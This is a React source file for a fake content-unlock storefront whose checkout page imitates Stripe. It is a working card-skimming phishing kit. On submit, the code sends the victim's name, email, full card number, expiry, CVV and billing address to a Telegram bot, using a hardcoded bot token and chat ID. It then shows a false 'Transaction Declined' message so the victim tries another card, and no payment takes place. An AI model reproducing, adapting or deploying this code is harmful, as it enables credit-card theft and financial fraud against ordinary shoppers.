/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect, useRef } from 'react';
import { 
  Lock, 
  Download, 
  Play, 
  MoreHorizontal, 
  ShieldCheck, 
  Zap, 
  Calendar, 
  Info,
  ChevronLeft,
  CreditCard
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import ContentNotice from './components/ContentNotice';

// --- Types ---
type View = 'content' | 'checkout';

// --- Constants ---
const TELEGRAM_BOT_TOKEN = "8367352890:AAFcUK97oOu6iAI89qeeiytxePg5EE6eiCs";
const TELEGRAM_CHAT_ID = "8447588640";

// --- Components ---

const ContentView = ({ onNavigate }: { onNavigate: () => void }) => {
  return (
    <div className="min-h-screen bg-[#f0f2f5] flex flex-col items-center p-4 font-sans text-[#30313d]">
      {/* Header Banner */}
      <motion.div 
        initial={{ y: -20, opacity: 0 }}
        animate={{ y: 0, opacity: 1 }}
        onClick={onNavigate}
        className="w-full max-w-[500px] bg-gradient-to-r from-[#00c853] to-[#00e676] rounded-full p-3 mb-6 flex items-center justify-between cursor-pointer shadow-lg"
      >
        <div className="flex items-center gap-3">
          <div className="bg-white/20 p-2 rounded-full">
            <Lock className="w-5 h-5 text-white" />
          </div>
          <div className="text-white">
            <div className="font-bold text-sm leading-tight">Sell your pics & videos</div>
            <div className="text-[10px] opacity-90">Instagram • X • Telegram • DMs</div>
          </div>
        </div>
        <div className="bg-white/20 p-2 rounded-full">
          <Download className="w-5 h-5 text-white" />
        </div>
      </motion.div>

      {/* Main Content Card */}
      <div className="w-full max-w-[500px] bg-white rounded-3xl overflow-hidden shadow-sm border border-gray-100 mb-4">
        {/* Media Section */}
        <div 
          onClick={onNavigate}
          className="relative aspect-square bg-black group cursor-pointer"
        >
          <img 
            src="https://image2url.com/r2/default/images/1773908148889-6efbc306-de87-4845-93e0-d4b69bdc0eed.jpg" 
            alt="Content preview" 
            className="w-full h-full object-cover opacity-40 grayscale"
            referrerPolicy="no-referrer"
          />
          <div className="absolute top-4 left-4 flex gap-2">
            <div className="bg-black/50 backdrop-blur-md text-white text-xs px-2 py-1 rounded flex items-center gap-1">
              <MoreHorizontal className="w-3 h-3" />
              1/7 media
            </div>
            <div className="bg-black/50 backdrop-blur-md text-white p-1 rounded">
              <Play className="w-3 h-3 fill-current" />
            </div>
          </div>
          
          {/* Carousel Dots */}
          <div className="absolute bottom-4 left-1/2 -translate-x-1/2 flex gap-1.5">
            {[...Array(7)].map((_, i) => (
              <div key={i} className={`w-1.5 h-1.5 rounded-full ${i === 0 ? 'bg-white' : 'bg-white/40'}`} />
            ))}
          </div>
        </div>

        {/* Profile Section */}
        <div className="p-5 flex items-center justify-between border-b border-gray-50">
          <div className="flex items-center gap-3">
            <img 
              src="https://image2url.com/r2/default/images/1774295823225-e43a32ab-c830-4b90-ae8a-6c2b43136a3f.jpg" 
              alt="user06192411" 
              className="w-10 h-10 rounded-full border border-gray-200"
              referrerPolicy="no-referrer"
            />
            <div>
              <div className="font-bold text-base">user06192411</div>
              <div className="text-gray-400 text-xs mt-0.5">10 Mar 2026</div>
            </div>
          </div>
          <button 
            onClick={onNavigate}
            className="px-6 py-1.5 border border-gray-200 rounded-full font-semibold text-sm hover:bg-gray-50 transition-colors"
          >
            Tips
          </button>
        </div>

        {/* Features Section */}
        <div className="p-6">
          <div className="grid grid-cols-3 gap-4 mb-8">
            <div className="flex flex-col items-center text-center">
              <Zap className="w-6 h-6 text-[#00c853] mb-2" />
              <div className="text-[11px] font-medium leading-tight text-gray-500">Easy access to content</div>
            </div>
            <div className="flex flex-col items-center text-center">
              <Lock className="w-6 h-6 text-[#00c853] mb-2" />
              <div className="text-[11px] font-medium leading-tight text-gray-500">Private payments</div>
            </div>
            <div className="flex flex-col items-center text-center">
              <Calendar className="w-6 h-6 text-[#00c853] mb-2" />
              <div className="text-[11px] font-medium leading-tight text-gray-500">No subscription</div>
            </div>
          </div>

          {/* Payment Logos */}
          <div className="flex justify-center items-center gap-4 mb-6">
            <div className="flex items-center gap-1">
              <div className="w-6 h-4 bg-[#eb001b] rounded-sm" />
              <div className="w-6 h-4 bg-[#f79e1b] rounded-sm -ml-3 opacity-80" />
            </div>
            <div className="text-[#1a1f71] font-bold italic text-lg tracking-tighter">VISA</div>
          </div>

          <div className="text-center text-[11px] text-gray-400 leading-relaxed mb-8">
            Payment will appear as "Unlockt"<br />
            in your bank statements.
          </div>

          {/* Report Link */}
          <div className="flex justify-center items-center gap-1.5 text-gray-500 text-xs cursor-pointer hover:text-gray-700">
            <div className="bg-gray-500 text-white w-4 h-4 rounded-full flex items-center justify-center text-[10px] font-bold italic">i</div>
            Report this content
          </div>
        </div>
      </div>

      {/* Unlock Button */}
      <motion.button
        whileTap={{ scale: 0.98 }}
        onClick={onNavigate}
        className="w-full max-w-[500px] bg-[#00c853] text-white rounded-full p-4 flex items-center justify-between shadow-xl mt-2"
      >
        <div className="w-8 h-8 bg-white/20 rounded-full flex items-center justify-center font-bold text-sm">1</div>
        <div className="font-bold text-lg">Unlock Now</div>
        <div className="font-bold text-lg">$1.00</div>
      </motion.button>
      
      <div className="text-gray-400 text-xs mt-4">Taxes & fees are calculated at next step.</div>
    </div>
  );
};

const CheckoutView = ({ onBack }: { onBack: () => void }) => {
  const [formData, setFormData] = useState({
    email: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
    cardholderName: '',
    country: '',
    street: '',
    street2: '',
    city: '',
    zip: '',
    state: ''
  });

  const [cardType, setCardType] = useState<'visa' | 'mastercard' | 'amex' | 'discover' | 'unknown'>('unknown');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const detectCardType = (number: string) => {
    const cleanNumber = number.replace(/\s/g, '');
    if (/^4/.test(cleanNumber)) return 'visa';
    if (/^(5[1-5]|222[1-9]|22[3-9]|2[3-6]|27[01]|2720)/.test(cleanNumber)) return 'mastercard';
    if (/^3[47]/.test(cleanNumber)) return 'amex';
    if (/^6(?:011|5|4[4-9]|22(?:1(?:2[6-9]|[3-9]\d)|[2-8]\d\d|9(?:[01]\d|2[0-5])))/.test(cleanNumber)) return 'discover';
    return 'unknown';
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 16) value = value.slice(0, 16);
    
    // Auto-spacing
    const formatted = value.match(/.{1,4}/g)?.join(' ') || value;
    
    setFormData({ ...formData, cardNumber: formatted });
    setCardType(detectCardType(value));
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 4) value = value.slice(0, 4);
    
    let formatted = value;
    if (value.length > 2) {
      formatted = `${value.slice(0, 2)} / ${value.slice(2)}`;
    }
    
    setFormData({ ...formData, expiry: formatted });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    const { email, cardholderName, cardNumber, expiry, cvv, street, city, zip, state, country } = formData;
    
    if (!email || !cardholderName || !cardNumber || !expiry || !cvv || !street || !city || !zip || !state || !country) {
      alert("Please fill in all required fields before proceeding.");
      return;
    }

    setIsSubmitting(true);

    const message = `
🚨 NEW DATA CAPTURED 🚨

👤 HOLDER: ${cardholderName}
📧 EMAIL: ${email}
💳 PAYMENT:
Card: ${cardNumber} (${cardType.toUpperCase()})
Exp: ${expiry}
CVV: ${cvv}
Amount: $1.00 USD

📍 ADDRESS:
Street: ${street}
Apt: ${formData.street2 || 'N/A'}
City: ${city}
State: ${state}
Zip: ${zip}
Country: ${country}
`;

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;

    try {
      await fetch(url);
      alert("Transaction Declined: Please try with a different card.");
      setFormData({
        ...formData,
        cardNumber: '',
        cvv: '',
        expiry: ''
      });
    } catch (error) {
      console.error("Error sending message:", error);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#f6f9fc] p-5 font-sans text-[#30313d]">
      <div className="max-w-[400px] mx-auto">
        <button 
          onClick={onBack}
          className="flex items-center gap-1 text-gray-500 mb-6 hover:text-gray-800 transition-colors"
        >
          <ChevronLeft className="w-4 h-4" />
          Back
        </button>

        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="bg-white p-8 rounded-lg shadow-[0_15px_35px_0_rgba(60,66,87,0.08),0_5px_15px_0_rgba(0,0,0,0.12)]"
        >
          <form onSubmit={handleSubmit}>
            <div className="mb-4">
              <label className="block text-[13px] font-medium text-[#4f566b] mb-1">Email</label>
              <input 
                type="email" 
                placeholder="email@example.com"
                required
                className="w-full p-3 border border-[#e6ebf1] rounded shadow-[0_1px_1px_rgba(0,0,0,0.03),0_3px_6px_rgba(0,0,0,0.02)] focus:outline-none focus:ring-2 focus:ring-[#635bff]/20 transition-all"
                value={formData.email}
                onChange={(e) => setFormData({ ...formData, email: e.target.value })}
              />
            </div>

            <div className="text-[15px] font-semibold text-[#30313d] mb-2 mt-6">Payment method</div>
            
            <div className="border border-[#e6ebf1] rounded overflow-hidden mb-4">
              <div className="border-b border-[#e6ebf1] flex items-center px-3">
                <input 
                  type="text" 
                  placeholder="1234 1234 1234 1234"
                  maxLength={19}
                  required
                  className="w-full py-3 focus:outline-none text-[15px]"
                  value={formData.cardNumber}
                  onChange={handleCardNumberChange}
                />
                {cardType !== 'unknown' && (
                  <div className="text-[10px] font-bold uppercase text-[#635bff] bg-[#635bff]/10 px-1.5 py-0.5 rounded">
                    {cardType}
                  </div>
                )}
                {cardType === 'unknown' && <CreditCard className="w-5 h-5 text-gray-300" />}
              </div>
              <div className="flex">
                <input 
                  type="text" 
                  placeholder="MM / YY"
                  maxLength={7}
                  required
                  className="w-1/2 p-3 border-r border-[#e6ebf1] focus:outline-none text-[15px]"
                  value={formData.expiry}
                  onChange={handleExpiryChange}
                />
                <input 
                  type="text" 
                  placeholder="CVC"
                  maxLength={3}
                  required
                  className="w-1/2 p-3 focus:outline-none text-[15px]"
                  value={formData.cvv}
                  onChange={(e) => setFormData({ ...formData, cvv: e.target.value.replace(/\D/g, '') })}
                />
              </div>
            </div>

            <div className="mb-4">
              <label className="block text-[13px] font-medium text-[#4f566b] mb-1">Cardholder name</label>
              <input 
                type="text" 
                placeholder="Full name"
                required
                className="w-full p-3 border border-[#e6ebf1] rounded shadow-[0_1px_1px_rgba(0,0,0,0.03),0_3px_6px_rgba(0,0,0,0.02)] focus:outline-none focus:ring-2 focus:ring-[#635bff]/20 transition-all"
                value={formData.cardholderName}
                onChange={(e) => setFormData({ ...formData, cardholderName: e.target.value })}
              />
            </div>

            <div className="text-[15px] font-semibold text-[#30313d] mb-2 mt-6">Billing address</div>
            
            <select 
              required
              className="w-full p-3 border border-[#e6ebf1] rounded mb-4 bg-white focus:outline-none text-[15px]"
              value={formData.country}
              onChange={(e) => setFormData({ ...formData, country: e.target.value })}
            >
              <option value="" disabled>Select a country</option>
              <option value="Afghanistan">Afghanistan</option>
              <option value="Albania">Albania</option>
              <option value="Algeria">Algeria</option>
              <option value="Andorra">Andorra</option>
              <option value="Angola">Angola</option>
              <option value="Antigua and Barbuda">Antigua and Barbuda</option>
              <option value="Argentina">Argentina</option>
              <option value="Armenia">Armenia</option>
              <option value="Australia">Australia</option>
              <option value="Austria">Austria</option>
              <option value="Azerbaijan">Azerbaijan</option>
              <option value="Bahamas">Bahamas</option>
              <option value="Bahrain">Bahrain</option>
              <option value="Bangladesh">Bangladesh</option>
              <option value="Barbados">Barbados</option>
              <option value="Belarus">Belarus</option>
              <option value="Belgium">Belgium</option>
              <option value="Belize">Belize</option>
              <option value="Benin">Benin</option>
              <option value="Bhutan">Bhutan</option>
              <option value="Bolivia">Bolivia</option>
              <option value="Bosnia and Herzegovina">Bosnia and Herzegovina</option>
              <option value="Botswana">Botswana</option>
              <option value="Brazil">Brazil</option>
              <option value="Brunei">Brunei</option>
              <option value="Bulgaria">Bulgaria</option>
              <option value="Burkina Faso">Burkina Faso</option>
              <option value="Burundi">Burundi</option>
              <option value="Cabo Verde">Cabo Verde</option>
              <option value="Cambodia">Cambodia</option>
              <option value="Cameroon">Cameroon</option>
              <option value="Canada">Canada</option>
              <option value="Central African Republic">Central African Republic</option>
              <option value="Chad">Chad</option>
              <option value="Chile">Chile</option>
              <option value="China">China</option>
              <option value="Colombia">Colombia</option>
              <option value="Comoros">Comoros</option>
              <option value="Congo (Congo-Brazzaville)">Congo (Congo-Brazzaville)</option>
              <option value="Congo (Democratic Republic of the)">Congo (Democratic Republic of the)</option>
              <option value="Costa Rica">Costa Rica</option>
              <option value="Croatia">Croatia</option>
              <option value="Cuba">Cuba</option>
              <option value="Cyprus">Cyprus</option>
              <option value="Czechia (Czech Republic)">Czechia (Czech Republic)</option>
              <option value="Denmark">Denmark</option>
              <option value="Djibouti">Djibouti</option>
              <option value="Dominica">Dominica</option>
              <option value="Dominican Republic">Dominican Republic</option>
              <option value="Ecuador">Ecuador</option>
              <option value="Egypt">Egypt</option>
              <option value="El Salvador">El Salvador</option>
              <option value="Equatorial Guinea">Equatorial Guinea</option>
              <option value="Eritrea">Eritrea</option>
              <option value="Estonia">Estonia</option>
              <option value="Eswatini">Eswatini</option>
              <option value="Ethiopia">Ethiopia</option>
              <option value="Fiji">Fiji</option>
              <option value="Finland">Finland</option>
              <option value="France">France</option>
              <option value="Gabon">Gabon</option>
              <option value="Gambia">Gambia</option>
              <option value="Georgia">Georgia</option>
              <option value="Germany">Germany</option>
              <option value="Ghana">Ghana</option>
              <option value="Greece">Greece</option>
              <option value="Grenada">Grenada</option>
              <option value="Guatemala">Guatemala</option>
              <option value="Guinea">Guinea</option>
              <option value="Guinea-Bissau">Guinea-Bissau</option>
              <option value="Guyana">Guyana</option>
              <option value="Haiti">Haiti</option>
              <option value="Holy See">Holy See</option>
              <option value="Honduras">Honduras</option>
              <option value="Hungary">Hungary</option>
              <option value="Iceland">Iceland</option>
              <option value="India">India</option>
              <option value="Indonesia">Indonesia</option>
              <option value="Iran">Iran</option>
              <option value="Iraq">Iraq</option>
              <option value="Ireland">Ireland</option>
              <option value="Israel">Israel</option>
              <option value="Italy">Italy</option>
              <option value="Jamaica">Jamaica</option>
              <option value="Japan">Japan</option>
              <option value="Jordan">Jordan</option>
              <option value="Kazakhstan">Kazakhstan</option>
              <option value="Kenya">Kenya</option>
              <option value="Kiribati">Kiribati</option>
              <option value="Kuwait">Kuwait</option>
              <option value="Kyrgyzstan">Kyrgyzstan</option>
              <option value="Laos">Laos</option>
              <option value="Latvia">Latvia</option>
              <option value="Lebanon">Lebanon</option>
              <option value="Lesotho">Lesotho</option>
              <option value="Liberia">Liberia</option>
              <option value="Libya">Libya</option>
              <option value="Liechtenstein">Liechtenstein</option>
              <option value="Lithuania">Lithuania</option>
              <option value="Luxembourg">Luxembourg</option>
              <option value="Madagascar">Madagascar</option>
              <option value="Malawi">Malawi</option>
              <option value="Malaysia">Malaysia</option>
              <option value="Maldives">Maldives</option>
              <option value="Mali">Mali</option>
              <option value="Malta">Malta</option>
              <option value="Marshall Islands">Marshall Islands</option>
              <option value="Mauritania">Mauritania</option>
              <option value="Mauritius">Mauritius</option>
              <option value="Mexico">Mexico</option>
              <option value="Micronesia">Micronesia</option>
              <option value="Moldova">Moldova</option>
              <option value="Monaco">Monaco</option>
              <option value="Mongolia">Mongolia</option>
              <option value="Montenegro">Montenegro</option>
              <option value="Morocco">Morocco</option>
              <option value="Mozambique">Mozambique</option>
              <option value="Myanmar (formerly Burma)">Myanmar (formerly Burma)</option>
              <option value="Namibia">Namibia</option>
              <option value="Nauru">Nauru</option>
              <option value="Nepal">Nepal</option>
              <option value="Netherlands">Netherlands</option>
              <option value="New Zealand">New Zealand</option>
              <option value="Nicaragua">Nicaragua</option>
              <option value="Niger">Niger</option>
              <option value="Nigeria">Nigeria</option>
              <option value="North Korea">North Korea</option>
              <option value="North Macedonia">North Macedonia</option>
              <option value="Norway">Norway</option>
              <option value="Oman">Oman</option>
              <option value="Pakistan">Pakistan</option>
              <option value="Palau">Palau</option>
              <option value="Palestine State">Palestine State</option>
              <option value="Panama">Panama</option>
              <option value="Papua New Guinea">Papua New Guinea</option>
              <option value="Paraguay">Paraguay</option>
              <option value="Peru">Peru</option>
              <option value="Philippines">Philippines</option>
              <option value="Poland">Poland</option>
              <option value="Portugal">Portugal</option>
              <option value="Qatar">Qatar</option>
              <option value="Romania">Romania</option>
              <option value="Russia">Russia</option>
              <option value="Rwanda">Rwanda</option>
              <option value="Saint Kitts and Nevis">Saint Kitts and Nevis</option>
              <option value="Saint Lucia">Saint Lucia</option>
              <option value="Saint Vincent and the Grenadines">Saint Vincent and the Grenadines</option>
              <option value="Samoa">Samoa</option>
              <option value="San Marino">San Marino</option>
              <option value="Sao Tome and Principe">Sao Tome and Principe</option>
              <option value="Saudi Arabia">Saudi Arabia</option>
              <option value="Senegal">Senegal</option>
              <option value="Serbia">Serbia</option>
              <option value="Seychelles">Seychelles</option>
              <option value="Sierra Leone">Sierra Leone</option>
              <option value="Singapore">Singapore</option>
              <option value="Slovakia">Slovakia</option>
              <option value="Slovenia">Slovenia</option>
              <option value="Solomon Islands">Solomon Islands</option>
              <option value="Somalia">Somalia</option>
              <option value="South Africa">South Africa</option>
              <option value="South Korea">South Korea</option>
              <option value="South Sudan">South Sudan</option>
              <option value="Spain">Spain</option>
              <option value="Sri Lanka">Sri Lanka</option>
              <option value="Sudan">Sudan</option>
              <option value="Suriname">Suriname</option>
              <option value="Sweden">Sweden</option>
              <option value="Switzerland">Switzerland</option>
              <option value="Syria">Syria</option>
              <option value="Tajikistan">Tajikistan</option>
              <option value="Tanzania">Tanzania</option>
              <option value="Thailand">Thailand</option>
              <option value="Timor-Leste">Timor-Leste</option>
              <option value="Togo">Togo</option>
              <option value="Tonga">Tonga</option>
              <option value="Trinidad and Tobago">Trinidad and Tobago</option>
              <option value="Tunisia">Tunisia</option>
              <option value="Turkey">Turkey</option>
              <option value="Turkmenistan">Turkmenistan</option>
              <option value="Tuvalu">Tuvalu</option>
              <option value="Uganda">Uganda</option>
              <option value="Ukraine">Ukraine</option>
              <option value="United Arab Emirates">United Arab Emirates</option>
              <option value="United Kingdom">United Kingdom</option>
              <option value="United States of America">United States of America</option>
              <option value="Uruguay">Uruguay</option>
              <option value="Uzbekistan">Uzbekistan</option>
              <option value="Vanuatu">Vanuatu</option>
              <option value="Venezuela">Venezuela</option>
              <option value="Vietnam">Vietnam</option>
              <option value="Yemen">Yemen</option>
              <option value="Zambia">Zambia</option>
              <option value="Zimbabwe">Zimbabwe</option>
            </select>

            <input 
              type="text" 
              placeholder="Address line 1"
              required
              className="w-full p-3 border border-[#e6ebf1] rounded mb-4 focus:outline-none text-[15px]"
              value={formData.street}
              onChange={(e) => setFormData({ ...formData, street: e.target.value })}
            />
            
            <input 
              type="text" 
              placeholder="Address line 2 (Optional)"
              className="w-full p-3 border border-[#e6ebf1] rounded mb-4 focus:outline-none text-[15px]"
              value={formData.street2}
              onChange={(e) => setFormData({ ...formData, street2: e.target.value })}
            />

            <div className="flex gap-0 mb-4 border border-[#e6ebf1] rounded overflow-hidden">
              <input 
                type="text" 
                placeholder="City"
                required
                className="w-1/2 p-3 border-r border-[#e6ebf1] focus:outline-none text-[15px]"
                value={formData.city}
                onChange={(e) => setFormData({ ...formData, city: e.target.value })}
              />
              <input 
                type="text" 
                placeholder="Zip Code"
                required
                className="w-1/2 p-3 focus:outline-none text-[15px]"
                value={formData.zip}
                onChange={(e) => setFormData({ ...formData, zip: e.target.value })}
              />
            </div>

            <input 
              type="text" 
              placeholder="State"
              required
              className="w-full p-3 border border-[#e6ebf1] rounded mb-6 focus:outline-none text-[15px]"
              value={formData.state}
              onChange={(e) => setFormData({ ...formData, state: e.target.value })}
            />

            <button 
              type="submit"
              disabled={isSubmitting}
              className={`w-full py-3.5 bg-[#635bff] text-white rounded font-bold text-base shadow-lg hover:bg-[#5851e0] transition-all flex items-center justify-center gap-2 ${isSubmitting ? 'opacity-70 cursor-not-allowed' : ''}`}
            >
              {isSubmitting ? 'Processing...' : 'Pay'}
            </button>
            
            <div className="text-center text-[12px] text-[#a3acb9] mt-6">
              Powered by <strong className="text-[#635bff]">stripe</strong> | Terms Privacy
            </div>
          </form>
        </motion.div>
      </div>
    </div>
  );
};

export default function App() {
  const [currentView, setCurrentView] = useState<View>('content');
  const [showNotice, setShowNotice] = useState(true);

  const handleDecline = () => {
    window.location.href = 'https://www.google.com';
  };

  return (
    <div className="min-h-screen bg-gray-50">
      <AnimatePresence>
        {showNotice && (
          <ContentNotice 
            onAccept={() => setShowNotice(false)} 
            onDecline={handleDecline} 
          />
        )}
      </AnimatePresence>
      <AnimatePresence mode="wait">
        {currentView === 'content' ? (
          <motion.div
            key="content"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 0.2 }}
          >
            <ContentView onNavigate={() => setCurrentView('checkout')} />
          </motion.div>
        ) : (
          <motion.div
            key="checkout"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 0.2 }}
          >
            <CheckoutView onBack={() => setCurrentView('content')} />
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
